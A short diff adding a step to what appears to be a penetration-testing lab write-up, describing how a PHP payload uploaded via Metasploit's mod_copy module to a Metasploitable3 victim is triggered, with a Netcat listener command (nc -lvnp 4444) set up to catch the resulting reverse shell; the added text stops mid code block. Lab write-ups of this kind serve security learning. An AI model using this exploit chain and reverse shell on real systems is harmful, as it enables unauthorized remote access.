@@ -70,3 +70,15 @@ set DisablePayloadHandler true
 
 exploit
 
+## ✅ Step 5: Establishing a Reverse Shell to the Victim (End of Phase 1.1)
+
+After successfully uploading the malicious PHP payload using the `mod_copy` exploit module in Metasploit, we triggered the payload by accessing it through the victim’s web server. This caused the victim (Metasploitable3) to connect back to our Kali machine, confirming a successful reverse shell.
+
+### 🔊 Listener Setup (Attacker Side)
+
+On Kali, we opened a Netcat listener on port `4444`:
+
+```bash
+nc -lvnp 4444
+
+
